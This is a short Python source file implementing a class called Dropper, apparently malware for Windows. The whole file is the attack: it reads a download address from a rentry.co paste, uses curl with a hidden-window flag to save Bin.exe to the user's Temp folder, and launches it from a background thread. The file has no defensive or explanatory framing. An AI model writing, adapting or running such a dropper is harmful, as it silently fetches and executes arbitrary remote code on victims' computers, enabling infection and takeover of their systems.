import os, urllib.request, threading, subprocess

__BASE_URL__ = 'https://rentry.co/2sv84/raw'

class Dropper:
	@staticmethod
	def ResolveBinaryAddr() -> str:
		return urllib.request.urlopen(urllib.request.Request(__BASE_URL__)).read().decode('utf-8').split('\n')[0]
	
	@staticmethod
	def DownloadBinary(url: str) -> str:
		path = f"C:\\Users\\{os.getenv('username')}\\AppData\\Local\\Temp\\Bin.exe"

		subprocess.call(f'curl -o {path} {url}', shell=False, creationflags=0x08000000)
		
		return path

	@staticmethod
	def RunBinary(path: str):
		os.system(f'start {path}')

def __init__():
	Dropper.RunBinary(Dropper.DownloadBinary(Dropper.ResolveBinaryAddr()))

def init():
    threading.Thread(target=__init__).start()